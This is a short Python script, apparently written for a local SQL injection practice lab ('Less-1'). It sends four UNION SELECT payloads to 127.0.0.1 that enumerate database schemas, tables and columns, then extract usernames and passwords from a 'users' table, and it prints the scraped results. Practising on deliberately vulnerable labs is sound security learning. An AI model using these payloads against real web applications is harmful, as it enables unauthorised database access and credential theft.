import requests
from lxml import etree


data1 = 'union select 1,group_concat(schema_name),3 from information_schema.schemata --+'
data2 = 'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\'security\' --+'
data3 = 'union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\'users\' --+'
data4 = 'union select 1,username,password from users where id=4  --+'
data = []
data.append(data1)
data.append(data2)
data.append(data3)
data.append(data4)

url = 'http://127.0.0.1/Less-1/?id=-1\''
for i in data:

    req = requests.post(url + i)
    html = req.text

    res = etree.HTML(html)
    result = res.xpath('//font/text()')
    print result